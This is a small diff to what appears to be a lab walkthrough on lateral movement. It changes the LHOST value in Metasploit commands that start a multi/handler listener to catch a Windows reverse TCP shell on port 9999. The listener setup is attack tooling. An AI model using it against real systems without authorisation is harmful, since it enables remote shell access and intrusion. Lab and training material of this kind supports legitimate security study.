@@ -73,7 +73,7 @@ _Start the msfconsole listener (used to catch the shell in one of the later step
 ```sh
 $ msfconsole
 msf6> use exploit/multi/handler
-msf6 exploit(multi/handler) > set LHOST lateralmovement
+msf6 exploit(multi/handler) > set LHOST <local_addr>
 msf6 exploit(multi/handler) > set LPORT 9999 
 msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
 msf6 exploit(multi/handler) > exploit 
